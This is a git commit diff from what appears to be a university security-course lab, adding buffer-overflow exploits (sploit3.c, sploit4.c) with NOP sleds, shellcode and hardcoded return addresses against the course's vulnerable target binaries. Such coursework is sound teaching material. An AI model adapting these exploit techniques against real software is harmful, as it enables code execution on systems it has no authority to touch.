835731c56d2c4c0aba10874e6ca19721af00d168
Ziwen  Wang <wang2213@p124.ecf.utoronto.ca>
2020-09-27 16:24:43 -0400

    part 3 and part 4

--- ece568-lab1-2020f/sploits/sploit3.c
+++ ece568-lab1-2020f/sploits/sploit3.c
@@ -5,15 +5,38 @@
 #include "shellcode-64.h"
 
 #define TARGET "../targets/target3"
-
+#define DEFAULT_BUFFER_SIZE  64
+#define NOP 0x90
+#define ZERO 0x00
 int
 main ( int argc, char * argv[] )
-{
+{	
 	char *	args[3];
 	char *	env[1];
+	int bsize = DEFAULT_BUFFER_SIZE;
+	char* buff, *ptr;
+	if (argc>1) bsize = atoi(argv[1]);	
+	
+	if(!(buff = (char*)malloc(bsize * sizeof(char)))){
+		printf("can't allocate memory\n");
+		exit(0);	
+	}
 
+	unsigned long *add_ptr;
+	int i;
+	for (i = 0; i < bsize; i++){
+		buff[i] = NOP;
+	}
+	//printf("the size of input is %d\n",strlen(buff));
+
+	ptr = buff + bsize - strlen(shellcode) - 4 ;
+	for (i=0; i<strlen(shellcode); i++){
+		*(ptr++) = shellcode[i];
+	}
+	char * s = "\x18\xfe\xa4\x40\x00";
+	
 	args[0] = TARGET;
-	args[1] = "hi there";
+	args[1] = strcat(buff, s);
 	args[2] = NULL;
 
 	env[0] = NULL;
--- ece568-lab1-2020f/sploits/sploit4.c
+++ ece568-lab1-2020f/sploits/sploit4.c
@@ -5,20 +5,51 @@
 #include "shellcode-64.h"
 
 #define TARGET "../targets/target4"
+#define DEFAULT_BUFFER_SIZE  201
+#define NOP 0x90
+#define ZERO 0x00
 
 int main(void)
 {
-  char *args[3];
-  char *env[1];
+	char *	args[3];
+	char *	env[8];
+	int bsize = DEFAULT_BUFFER_SIZE;
+	char* buff, *ptr;	
 
-  args[0] = TARGET; 
-  args[1] = "hi there"; 
-  args[2] = NULL;
-  
-  env[0] = NULL;
+	if(!(buff = (char*)malloc(bsize * sizeof(char)))){
+		printf("can't allocate memory\n");
+		exit(0);	
+	}
 
-  if (0 > execve(TARGET, args, env))
-    fprintf(stderr, "execve failed.\n");
+	unsigned long *add_ptr;
+	int i;
+	for (i = 0; i < bsize; i++){
+		buff[i] = NOP;
+	}
+	//printf("the size of input is %d\n",strlen(buff));
+
+	ptr = buff + bsize - strlen(shellcode)  - 1 ;
+	for (i=0; i<strlen(shellcode); i++){
+		*(ptr++) = shellcode[i];
+	}
+	*(ptr) = 0xdc;
+
+
+	  args[0] = TARGET; 
+	  args[1] = buff; 
+	  args[2] = NULL;
+	  
+	env[0] = "\x00";
+	env[1] = "\x00";
+	env[2] = "\xCC";
+	env[3] = "\x00";
+	env[4] = "\x00";
+	env[5] = "\x00";
+	env[6] = "\x90\x90\x90\x90\x90\x90";
+	env[7] = "\x90\xfd\xa4\x40";
+
+	  if (0 > execve(TARGET, args, env))
+	    fprintf(stderr, "execve failed.\n");
 
   return 0;
 }
